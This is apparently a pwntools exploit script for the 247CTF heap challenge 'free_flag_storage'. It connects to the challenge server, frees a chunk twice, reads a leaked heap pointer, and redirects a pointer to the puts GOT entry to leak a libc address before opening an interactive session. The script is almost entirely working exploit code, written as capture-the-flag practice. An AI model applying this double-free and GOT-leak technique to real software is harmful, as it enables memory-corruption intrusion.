from pwn import *

elf = ELF("free_flag_storage")
libc = ELF("libc-2.27.so")
# r=elf.process(env={"LD_PRELOAD":libc.path})
r = remote("c7255e4442671910.247ctf.com", 50440)
banner = "-------------------------"
input("attach gdb")


def view():
    r.recvuntil(banner)
    r.sendline("print")


def add(size, data, index, score):
    r.recvuntil(banner)
    r.sendline("add")
    r.recvline()
    r.recvuntil("length:")
    r.sendline(str(size))
    r.recvuntil("value:\n")
    r.sendline(data)
    r.recvuntil("challenge_id:")
    r.sendline(str(index))
    r.recvuntil("score:")
    r.sendline(str(score))


def edit(index, data, score):
    r.recvuntil(banner)
    r.sendline("edit")
    r.recvuntil("edit:\n")
    r.sendline(str(index))
    r.recvuntil("):\n")
    r.sendline(data)
    r.recvuntil("challenge_id:")
    r.sendline(str(index))
    r.recvuntil("score:")
    r.sendline(str(score))


def delete(index):
    r.recvuntil(banner)
    r.sendline("delete")
    r.recvuntil("delete:\n")
    r.sendline(str(index))


add(0x20, "A" * 0x20, 0, 1)
add(0x20, "B" * 0x20, 0, 2)
add(0x20, "C" * 0x20, 0, 3)
# pause()
delete(0)
delete(0)
# pause()
view()
r.recvuntil("247CTF{")
leak = u32(r.recv(4))
print(hex(leak))
# pause()
edit(0, p32(elf.got['puts']), 0)
view()
r.recvuntil("247CTF{")
puts = u32(r.recv(4))
print(hex(puts))
r.interactive()
